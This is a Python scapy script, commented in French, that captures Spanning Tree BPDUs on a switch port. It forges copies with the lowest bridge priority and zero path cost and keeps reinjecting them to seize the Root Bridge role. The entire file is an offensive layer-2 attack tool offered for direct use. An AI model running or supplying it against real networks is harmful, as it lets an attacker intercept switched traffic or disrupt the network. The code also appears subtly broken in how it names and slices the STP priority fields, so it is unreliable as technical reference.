from scapy.all import *
from scapy.layers.l2 import Dot3, LLC, STP

def intercept_and_modify_stp(interface):
    """
    Capture le trafic STP, modifie les paramètres pour se faire élire Root Bridge,
    et réinjecte les trames modifiées.
    Args:
        interface (str): Interface réseau connectée au switch.
    """
    print(f"Listening for STP traffic on {interface}...")

    def modify_and_send(packet):
        """
        Modifie les paramètres du BPDU pour devenir Root Bridge et réinjecte la trame.
        Args:
            packet: La trame BPDU capturée.
        """
        if packet.haslayer(STP):
            print(f"Captured BPDU: {packet.summary()}")
            
            # Modifier les paramètres pour devenir Root Bridge
            forged_packet = packet.copy()
            forged_packet[STP].root_id = f"0000{packet[STP].root_id[4:]}"  # Abaisser la priorité à 0x0000
            forged_packet[STP].bridge_id = f"0000{packet[STP].bridge_id[4:]}"  # Priorité très basse
            forged_packet[STP].root_path_cost = 0  # Chemin direct

            print(f"Forged BPDU: {forged_packet.summary()}")
            
            # Réinjecter la trame forgée
            sendp(forged_packet, iface=interface, verbose=False)
            print("Injected forged BPDU into the network.")

    # Capture en continu des trames STP et les modifie
    sniff(iface=interface, filter="ether dst 01:80:c2:00:00:00", prn=modify_and_send)

if __name__ == "__main__":
    import sys

    if len(sys.argv) != 2:
        print("Usage: python stp_intercept_modify.py <interface>")
        sys.exit(1)

    interface = sys.argv[1]
    intercept_and_modify_stp(interface)
